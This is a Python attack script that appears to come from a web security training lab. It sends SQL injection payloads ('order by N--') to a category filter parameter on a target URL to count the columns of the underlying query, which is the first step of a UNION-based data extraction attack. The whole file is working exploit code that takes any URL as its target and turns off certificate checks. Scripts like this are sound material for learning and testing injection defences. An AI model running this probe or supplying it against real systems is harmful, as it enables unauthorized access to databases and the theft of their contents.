# UNION attack determining the number of columns returned by the query
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def count_columns(url):
    path = '/filter?category=Corporate+gifts'
    for i in range(1,10):
        payload = "'+order+by+%s--" %i
        res = requests.get(url+path+payload, verify=False, proxies=proxies)
        if res.status_code != 200:
            return i-1
    return False
            


if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("(+) Usage: %s <url>" %sys.argv[0])
        print("(+) Example : %s http://example.com " %sys.argv[0])
        sys.exit(-1)
    print("(+) counting number of columns...")
    col = count_columns(url)
    if col:
        print("The number of columns are "+str(col)+".")
    else:
        print("SQL Injection failed.")